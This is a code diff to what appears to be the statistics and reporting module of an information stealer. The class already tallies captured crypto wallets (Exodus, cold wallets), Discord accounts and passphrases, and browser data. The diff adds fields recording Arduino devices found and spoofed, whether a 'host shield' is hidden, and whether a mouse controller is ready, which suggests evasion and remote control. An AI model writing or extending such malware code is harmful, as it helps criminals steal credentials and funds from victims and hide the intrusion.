@@ -46,6 +46,13 @@ class Statistics {
             discord: {
                 accounts: [],
                 passphrases: []
+            },
+            arduino: {
+                devicesFound: 0,
+                devicesSpoofed: 0,
+                hostShieldHidden: false,
+                mouseControllerReady: false,
+                deviceTypes: []
             }
         };
     }
@@ -183,6 +190,30 @@ class Statistics {
     }
 
     /**
+     * Add Arduino statistics
+     * @param {Object} arduinoData - Arduino collection results
+     */
+    addArduino(arduinoData) {
+        if (arduinoData) {
+            this.data.arduino.devicesFound = arduinoData.devicesFound || 0;
+            this.data.arduino.devicesSpoofed = arduinoData.devicesSpoofed || 0;
+            this.data.arduino.hostShieldHidden = arduinoData.hostShieldHidden || false;
+            this.data.arduino.mouseControllerReady = arduinoData.mouseControllerReady || false;
+            
+            // Extract device types if available
+            if (arduinoData.deviceTypes && Array.isArray(arduinoData.deviceTypes)) {
+                this.data.arduino.deviceTypes = arduinoData.deviceTypes;
+            }
+            
+            logger.debug('Arduino statistics updated', {
+                devicesFound: this.data.arduino.devicesFound,
+                devicesSpoofed: this.data.arduino.devicesSpoofed,
+                hostShieldHidden: this.data.arduino.hostShieldHidden
+            });
+        }
+    }
+
+    /**
      * Set system information
      * @param {Object} systemInfo - System information
      */
@@ -208,6 +239,8 @@ class Statistics {
                 totalWallets:
                     this.data.collections.exodus.length + this.data.collections.colds.length,
                 totalDiscordAccounts: this.data.discord.accounts.length,
+                totalArduinoDevices: this.data.arduino.devicesFound,
+                totalSpoofedDevices: this.data.arduino.devicesSpoofed,
                 timestamp: this.data.system.timestamp
             },
             browsers: this.data.browsers,
@@ -216,6 +249,13 @@ class Statistics {
             discord: {
                 accountCount: this.data.discord.accounts.length,
                 hasPassphrases: this.data.discord.passphrases.length > 0
+            },
+            arduino: {
+                devicesFound: this.data.arduino.devicesFound,
+                devicesSpoofed: this.data.arduino.devicesSpoofed,
+                hostShieldHidden: this.data.arduino.hostShieldHidden,
+                mouseControllerReady: this.data.arduino.mouseControllerReady,
+                deviceTypes: this.data.arduino.deviceTypes
             }
         };
     }
